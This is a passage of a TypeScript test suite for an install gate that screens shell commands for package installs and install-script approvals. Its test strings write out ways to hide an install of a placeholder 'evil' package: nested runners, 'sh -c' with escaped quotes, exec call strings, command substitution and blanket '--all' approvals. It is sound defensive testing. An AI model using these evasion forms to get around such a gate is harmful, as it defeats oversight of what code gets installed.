      assert.ok(parseInstallCommand(cmd).refs.includes("npm:evil"), cmd);
    }
    assert.ok(
      parseInstallCommand('corepack pnpm@9 exec --call "pip install evil"').refs.includes(
        "pip:evil",
      ),
    );
  });

  it("a runner whose first positional is a package manager recurses the inner install", () => {
    // `npx npm i evil` runs npm's install for real; the runner alone would gate only npm:npm.
    for (const cmd of [
      "npx npm i evil",
      "pnpm exec npm i evil",
      "yarn dlx npm i evil",
      "npm exec npm i evil",
      "corepack pnpm@9 exec yarn add evil",
      "npx pip install evil",
      // flags / `--` between the runner and the inner manager must not let it escape
      "npx -y npm i evil",
      "npx --yes npm i evil",
      "npm exec -- npm i evil",
    ]) {
      assert.ok(
        parseInstallCommand(cmd).refs.includes("npm:evil") ||
          parseInstallCommand(cmd).refs.includes("pip:evil"),
        cmd,
      );
    }
    // a normal runner fetching a real tool is unaffected (gates the tool, no over-trigger)
    assert.deepEqual(parseInstallCommand("npx tsc --build").refs, ["npm:tsc"]);
    assert.deepEqual(parseInstallCommand("npx create-react-app myapp").refs, [
      "npm:create-react-app",
    ]);
  });

  it("chaining flag-tolerance is ReDoS-safe (no catastrophic backtracking)", () => {
    // A long run of `-x=y`-shaped tokens with no trailing package manager forced the earlier
    // regex (overlapping `-\S+` / `\S+=\S+` alternatives) into 2^N parse paths. The mutually
    // exclusive alternatives make it linear — this completes near-instantly instead of hanging.
    const cmd = "npm exec " + "-x=y ".repeat(400) + "sometool";
    const start = process.hrtime.bigint();
    const p = parseInstallCommand(cmd);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    assert.ok(ms < 500, `parse took ${ms}ms — possible ReDoS regression`);
    assert.deepEqual(p.refs, ["npm:sometool"]);
  });

  it("segment splitting is linear on whitespace-padded input (no O(N^2) blowup)", () => {
    // A long leading whitespace run made SEGMENT_SPLIT's `\s*` padding quadratic (~30s at
    // 200k). Detection stays correct; this guards the timing.
    const cmd = " ".repeat(200000) + "npm i evil";
    const start = process.hrtime.bigint();
    const p = parseInstallCommand(cmd);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    assert.ok(ms < 500, `parse took ${ms}ms — possible O(N^2) regression`);
    assert.deepEqual(p.refs, ["npm:evil"]);
  });

  it("nested-command queue is linear on many duplicate nested items (no O(N^2) shift)", () => {
    // `queue.shift()` on a large array was O(N); N identical `$(…)` items → O(N^2) (~4.5s at
    // 80k). A head cursor + push-dedup makes it linear.
    const cmd = "$(npm i evil) ".repeat(80000);
    const start = process.hrtime.bigint();
    const p = parseInstallCommand(cmd);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    assert.ok(ms < 1500, `parse took ${ms}ms — possible O(N^2) regression`);
    assert.equal(p.isInstall, true); // fail-closed: unresolvable indirection
  });

  it("exec -c/--call shell string is recursed, not mis-gated as a package", () => {
    for (const cmd of [
      'npm exec -c "npm i evil"',
      'npm exec --call "npm i evil"',
      'pnpm exec -c "npm i evil"',
      'pnpm dlx -c "npm i evil"',
      'yarn exec -c "npm i evil"',
      'bun x -c "npm i evil"',
    ]) {
      // the inner install is gated; the runner does NOT gate the shell string's first word
      assert.deepEqual(parseInstallCommand(cmd).refs, ["npm:evil"], cmd);
    }
    // exec WITHOUT a call flag still gates the fetched tool positionally
    assert.deepEqual(parseInstallCommand("npm exec cowsay").refs, ["npm:cowsay"]);
    // --package alongside -c: the package is still gated, the call string recursed
    assert.deepEqual(parseInstallCommand('npm exec --package=evil -c "cmd"').refs, ["npm:evil"]);
  });

  it("a backslash-escaped quote inside a nested shell -c does not end the arg early", () => {
    // `sh -c "sh -c \"npm i evil\""` — the escaped inner quotes are NOT the closer, so the
    // inner install must still be recursed and gated (across shell -c, exec -c, and eval).
    assert.deepEqual(parseInstallCommand('sh -c "sh -c \\"npm i evil\\""').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash -c "bash -lc \\"pip install evil\\""').refs, [
      "pip:evil",
    ]);
    assert.deepEqual(parseInstallCommand('npm exec -c "sh -c \\"npm i evil\\""').refs, [
      "npm:evil",
    ]);
    // the single-quote inner form and plain forms still work
    assert.deepEqual(parseInstallCommand("sh -c \"sh -c 'npm i evil'\"").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash -c "npm i evil"').refs, ["npm:evil"]);
  });

  it("escaped-quote body regex is ReDoS-safe (backslash run stays linear)", () => {
    const cmd = 'bash -c "' + "\\".repeat(200000);
    const start = process.hrtime.bigint();
    parseInstallCommand(cmd);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    assert.ok(ms < 500, `parse took ${ms}ms — possible ReDoS regression`);
  });

  it("a -c AFTER the exec command is the TOOL's flag — the package is still gated", () => {
    // `npm exec jest -c jest.config.js`: -c belongs to jest; jest is a fetched package that
    // must NOT be suppressed. Only a -c/--call BEFORE the command is npm's shell-call flag.
    assert.deepEqual(parseInstallCommand("npm exec jest -c jest.config.js").refs, ["npm:jest"]);
    assert.deepEqual(parseInstallCommand("npm exec eslint . -c .eslintrc").refs, ["npm:eslint"]);
    assert.deepEqual(parseInstallCommand("npm exec --package foo -c bar").refs, ["npm:foo"]);
  });
});

// Fake triage: pass everything except names in `blocklist`.
function fakeDeps(blocklist: string[] = []): GateDeps {
  return {
    runTriage: async (type: TriageType, target: string) => ({
      type,
      target,
      passed: !blocklist.includes(target),
      output: blocklist.includes(target) ? "TRIAGE FAILED" : "TRIAGE PASSED",
    }),
  };
}

describe("decideBashGate — decision", () => {
  it("allows a non-install command without triaging", async () => {
    const v = await decideBashGate("git status", fakeDeps());
    assert.equal(v.block, false);
    assert.equal(v.checked.length, 0);
  });

  it("allows when every target triages PASS", async () => {
    const v = await decideBashGate("npm i express && pip install requests", fakeDeps());
    assert.equal(v.block, false);
    assert.equal(v.checked.length, 2);
  });

  it("BLOCKS when any target fails triage (fail-closed)", async () => {
    const v = await decideBashGate("npm i express evil-pkg", fakeDeps(["evil-pkg"]));
    assert.equal(v.block, true);
    assert.match(v.reason, /triage did not pass|evil-pkg/);
  });

  it("BLOCKS an unverifiable in-scope install without calling triage", async () => {
    let called = false;
    const deps: GateDeps = {
      runTriage: async (type, target) => {
        called = true;
        return { type, target, passed: true, output: "" };
      },
    };
    const v = await decideBashGate("npm install git+https://github.com/x/y", deps);
    assert.equal(v.block, true);
    assert.equal(called, false, "must not triage when target is unverifiable — block outright");
    assert.match(v.reason, /cannot reduce to a triage target/);
  });

  it("local-only install neither blocks nor triages", async () => {
    const v = await decideBashGate("pip install -e .", fakeDeps());
    assert.equal(v.block, false);
  });
});

describe("decideBashGate — local node_modules/.bin shadowing (npx tsc case)", () => {
  it("skips triage for a plain `npx <name>` when a local .bin/<name> exists", async () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-localbin-"));
    try {
      mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
      writeFileSync(join(dir, "node_modules", ".bin", "tsc"), "#!/bin/sh\n");
      let triaged = false;
      const deps: GateDeps = {
        runTriage: async (type, target) => {
          triaged = true;
          return { type, target, passed: false, output: "TRIAGE FAILED" };
        },
      };
      const v = await decideBashGate("npx tsc --noEmit", deps, dir);
      assert.equal(triaged, false, "must not triage a locally-shadowed binary at all");
      assert.equal(v.block, false);
      assert.equal(v.checked.length, 0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("still triages when no local .bin/<name> exists at cwd", async () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-localbin-"));
    try {
      const v = await decideBashGate("npx tsc --noEmit", fakeDeps(["tsc"]), dir);
      assert.equal(
        v.block,
        true,
        "no local shadow — the (unrelated, abandoned) registry tsc is still gated",
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("without a cwd argument, behavior is unchanged (always triages)", async () => {
    const v = await decideBashGate("npx tsc --noEmit", fakeDeps(["tsc"]));
    assert.equal(v.block, true);
  });

  it("does not shadow a `-p`/--package replace-flag target — only the plain positional", async () => {
    const dir = mkdtempSync(join(tmpdir(), "kit-localbin-"));
    try {
      mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
      // A local `cowsay` binary exists, but `-p evil` REPLACES the fetched package —
      // npx fetches `evil` regardless of what's in .bin, so it must still be gated.
      writeFileSync(join(dir, "node_modules", ".bin", "evil"), "#!/bin/sh\n");
      const v = await decideBashGate("npx -p evil cowsay", fakeDeps(["evil"]), dir);
      assert.equal(v.block, true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("parseInstallCommand — install-script approval is a grant, not a read", () => {
  // Both spellings MEASURED on npm 11.19.0: the namespaced `npm install-scripts
  // approve|deny|ls|prune` (what the client's own warning tells you to run) and the flat
  // `npm approve-scripts` alias the docs describe.
  const probe = (cmd: string) => parseInstallCommand(cmd);

  it("`npm approve-scripts <pkg>` gates each named package", () => {
    // npm skips a dependency's install scripts unless package.json's `allowScripts` names
    // it. Approving is the moment that dependency gains arbitrary code execution at install
    // time — the exact decision this gate exists to hold — so the operand is triaged.
    assert.deepEqual(probe("npm approve-scripts sharp").refs, ["npm:sharp"]);
    assert.deepEqual(probe("npm approve-scripts canvas sharp").refs, ["npm:canvas", "npm:sharp"]);
    assert.equal(probe("npm approve-scripts sharp").isInstall, true);
  });

  it("`npm install-scripts approve <pkg>` gates the same way", () => {
    assert.deepEqual(probe("npm install-scripts approve sharp").refs, ["npm:sharp"]);
    assert.equal(probe("npm install-scripts approve sharp").isInstall, true);
  });

  it("carries the pinned version npm writes into the allowScripts key", () => {
    assert.deepEqual(probe("npm approve-scripts sharp@0.33.5").refs, ["npm:sharp@0.33.5"]);
  });

  it("`--all` / `-a` approves everything pending — nothing to triage, so fail-closed", () => {
    for (const cmd of [
      "npm approve-scripts --all",
      "npm install-scripts approve --all",
      "npm install-scripts approve -a",
    ]) {
      const p = probe(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.deepEqual(p.refs, [], cmd);
      assert.deepEqual(p.unverifiable, ["approve-scripts-all"], cmd);
    }
  });

  it("a bare approve is an interactive grant → fail-closed", () => {
    const p = probe("npm approve-scripts");
    assert.equal(p.isInstall, true);
    assert.deepEqual(p.unverifiable, ["approve-scripts-interactive"]);
  });

  it("the read-only faces are never gated", () => {
    // Blocking review would push an agent straight to `--all`, the opposite of what this
    // gate wants. `--dry-run` writes nothing; ls reports; deny and prune only REMOVE grants.
    for (const cmd of [
      "npm approve-scripts --allow-scripts-pending",
      "npm approve-scripts --allow-scripts-pending --json",
      "npm install-scripts ls",
      "npm install-scripts deny sharp",
      "npm install-scripts deny --all",
      "npm install-scripts prune",
      "npm install-scripts approve --all --dry-run",
      "npm deny-scripts sharp",
    ]) {
      const p = probe(cmd);
      assert.equal(p.isInstall, false, cmd);
      assert.deepEqual(p.unverifiable, [], cmd);
      assert.deepEqual(p.refs, [], cmd);
    }
  });

  it("`pnpm approve-builds` grants the same execution, interactively → fail-closed", () => {
    const p = probe("pnpm approve-builds");
    assert.equal(p.isInstall, true);
    assert.deepEqual(p.unverifiable, ["approve-builds-interactive"]);
  });
});

describe("decideBashGate — approval of install scripts", () => {
  it("BLOCKS approving a package that does not triage PASS", async () => {
    const v = await decideBashGate("npm approve-scripts evil-pkg", fakeDeps(["evil-pkg"]));
    assert.equal(v.block, true);
    assert.match(v.reason, /evil-pkg/);
  });

  it("BLOCKS the namespaced spelling too", async () => {
    const v = await decideBashGate("npm install-scripts approve evil-pkg", fakeDeps(["evil-pkg"]));
    assert.equal(v.block, true);
  });

  it("allows approving a package that triages PASS", async () => {
    const v = await decideBashGate("npm approve-scripts sharp", fakeDeps());
    assert.equal(v.block, false);
    assert.equal(v.checked.length, 1);
  });

  it("BLOCKS `--all` without triaging anything", async () => {
    let called = false;
    const deps: GateDeps = {
      runTriage: async (type, target) => {
        called = true;
        return { type, target, passed: true, output: "" };
      },
    };
    const v = await decideBashGate("npm approve-scripts --all", deps);
    assert.equal(v.block, true);
    assert.equal(called, false, "nothing named → nothing to triage; block outright");
    assert.match(v.reason, /cannot reduce to a triage target/);
  });
});

/**
 * A refusal that misdescribes what it caught trains people to route around the gate.
 *
 * Reported as a false positive: `git commit -m "… \`deployment:env:view\` …"` blocked with
 * "cannot reduce to a triage target … run `kit triage`". The gate was RIGHT — backticks inside
 * double quotes are command substitution, so the shell runs the token and splices its output in,
 * silently deleting the words:
 *
 *     $ bash -c 'echo "... the permission `deployment:env:view` ..."'
 *     bash: deployment:env:view: command not found
 *     ... the permission  ...
 *
 * but the message talked about triage targets, so the operator concluded kit had mis-parsed a
 * commit message and reached for `-F`, hiding a command that would have committed a hole. These
 * tests pin the wording that names the hazard, and pin that ordinary install refusals keep the
 * triage advice — the fix must not blunt the common case.
 */
describe("install-gate — the refusal names the hazard (#501)", () => {
  it("explains a backtick substitution instead of naming a triage target", () => {
    const msg = explainUnverifiable(["indirect-bin:`deployment:env:view`"]);
    assert.ok(msg, "a substitution token must get its own explanation");
    assert.match(msg, /COMMAND SUBSTITUTION/);
    assert.match(msg, /single quotes are literal/);
    assert.match(msg, /git commit -F/);
    assert.doesNotMatch(msg, /triage/i, "triage is nonsense advice for shell quoting");
  });

  it("explains $( ) substitution too", () => {
    const msg = explainUnverifiable(["indirect-bin:$(which npm)"]);
    assert.ok(msg);
    assert.match(msg, /COMMAND SUBSTITUTION/);
    // No backtick-specific aside when the form is $( ).
    assert.doesNotMatch(msg, /backticks substitute inside double quotes/);
  });

  it("leaves every other unverifiable reason to the generic wording", () => {
    assert.equal(explainUnverifiable(["indirect-bin:$PM"]), null);
    assert.equal(explainUnverifiable([]), null);
  });

  it("the blocked verdict carries the hazard, not the machinery", async () => {
    const v = await decideBashGate("`deployment:env:view` install foo");
    assert.equal(v.block, true);
    assert.match(v.reason, /COMMAND SUBSTITUTION/);
    assert.doesNotMatch(v.reason, /cannot reduce to a triage target/);
  });

  it("a bare-variable indirection still gets the generic refusal", async () => {
    const v = await decideBashGate("$PM install evil");
    assert.equal(v.block, true);
    assert.match(v.reason, /cannot reduce to a triage target/);
  });
});
